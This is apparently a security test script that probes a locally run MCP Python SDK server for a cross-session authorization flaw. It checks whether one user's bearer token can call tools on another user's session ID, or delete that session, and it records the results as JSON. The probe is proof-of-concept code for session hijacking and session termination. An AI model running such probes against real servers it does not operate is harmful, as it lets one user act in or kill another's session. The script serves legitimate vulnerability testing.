#!/usr/bin/env python3
"""CX-3 dynamic probe: P-A0 / P-A1 / P-A2 against self-operated
   official Python MCP SDK 2.3.0 target (localhost:8931).
   Emits verdict JSON. No secrets, no third-party targets."""
import json, urllib.request, urllib.error, sys

BASE = "http://127.0.0.1:8931/mcp"
INIT = {"jsonrpc":"2.0","id":1,"method":"initialize","params":{
        "protocolVersion":"2025-06-18","capabilities":{},
        "clientInfo":{"name":"cx3-probe","version":"0.1"}}}
CALL = {"jsonrpc":"2.0","id":2,"method":"tools/call","params":{
        "name":"marker_exec","arguments":{"note":"P-A1 marker from attacker subject"}}}
results = []

def req(method="POST", token=None, sid=None, body=None, label=""):
    r = urllib.request.Request(BASE, method=method)
    r.add_header("Accept", "application/json, text/event-stream")
    r.add_header("Content-Type", "application/json")
    if token: r.add_header("Authorization", f"Bearer {token}")
    if sid:   r.add_header("mcp-session-id", sid)
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(r, data=data, timeout=10) as resp:
            return {"label": label, "status": resp.status,
                    "sid_out": resp.headers.get("mcp-session-id"),
                    "body": resp.read()[:400].decode(errors="replace")}
    except urllib.error.HTTPError as e:
        return {"label": label, "status": e.code,
                "sid_out": e.headers.get("mcp-session-id"),
                "body": e.read()[:400].decode(errors="replace")}

# P-A0: auth is real?
results.append(req(token=None, body=INIT, label="P-A0 no-token"))
results.append(req(token="token_BOGUS", body=INIT, label="P-A0 bad-token"))

# Victim session (subject V)
r = req(token="token_V", body=INIT, label="V-init")
results.append(r)
sid_V = r.get("sid_out")
req(token="token_V", sid=sid_V, body={"jsonrpc":"2.0","method":"notifications/initialized"}, label="V-initialized-note")

# Attacker session (subject A)
r = req(token="token_A", body=INIT, label="A-init")
results.append(r)
sid_A = r.get("sid_out")
req(token="token_A", sid=sid_A, body={"jsonrpc":"2.0","method":"notifications/initialized"}, label="A-initialized-note")

# Control: V on own session must work
results.append(req(token="token_V", sid=sid_V, body={"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"marker_exec","arguments":{"note":"victim self"}}}, label="CONTROL V+self"))

# P-A1: attacker subject A + victim session sid_V -> tools/call
results.append(req(token="token_A", sid=sid_V, body=CALL, label="P-A1 A-tools/call-on-sidV"))

# P-A2: attacker subject A + sid_V -> session DELETE
results.append(req(method="DELETE", token="token_A", sid=sid_V, label="P-A2 A-DELETE-sidV"))

# Post-check: is victim session dead?
results.append(req(token="token_V", sid=sid_V, body={"jsonrpc":"2.0","id":10,"method":"tools/call","params":{"name":"marker_exec","arguments":{"note":"victim post-kill"}}}, label="P-A2b V-self-after-A-kill"))

# sid entropy sample
print("SID_V:", sid_V, file=sys.stderr)
json.dump({"target":"python-mcp-sdk 2.3.0 self-operated localhost","date":"2026-11-16","results":results},
          open("verdict.json","w"), indent=1, ensure_ascii=False)
for r in results:
    print(f"{r['label']:34s} -> {r['status']} | sid_out={str(r.get('sid_out'))[:12]} | {r['body'][:90]!r}")
